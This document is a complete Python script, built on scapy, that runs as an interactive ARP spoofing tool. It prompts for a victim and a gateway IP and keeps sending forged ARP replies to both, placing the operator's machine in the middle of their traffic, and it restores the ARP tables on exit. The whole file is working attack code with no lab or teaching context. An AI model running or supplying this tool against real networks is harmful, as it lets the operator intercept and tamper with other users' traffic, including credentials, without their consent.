#!/usr/bin/env python3
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    """
    Sends an ARP request to resolve the MAC address for the specified IP.
    """
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast / request
    answered_list = scapy.srp(final_packet, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] Could not resolve MAC address for {ip}. Exiting.")
        sys.exit(1)

def spoof(target_ip, spoof_ip):
    """
    Sends a forged ARP reply to the target, telling it that the spoof_ip is at our MAC.
    """
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    """
    Sends genuine ARP replies to restore the correct mapping between dest_ip and src_ip.
    """
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                         psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=5, verbose=False)

def main():
    print("=== ARP Spoofing Tool ===")
    target_ip = input("Enter target IP (victim): ").strip()
    gateway_ip = input("Enter gateway IP: ").strip()
    
    print("\n[*] Starting ARP spoofing. Press CTRL+C to stop and restore ARP tables.\n")
    
    packets_sent = 0
    try:
        while True:
            # Tell the target that the gateway is at our MAC
            spoof(target_ip, gateway_ip)
            # Tell the gateway that the target is at our MAC (for a MITM attack)
            spoof(gateway_ip, target_ip)
            
            packets_sent += 2
            # Print a status message showing progress on the same line
            sys.stdout.write(f"\r[+] Packets sent: {packets_sent}")
            sys.stdout.flush()
            
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n\n[!] Detected CTRL+C. Restoring ARP tables, please hold...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] ARP tables restored. Exiting.")
        sys.exit(0)

if __name__ == "__main__":
    main()
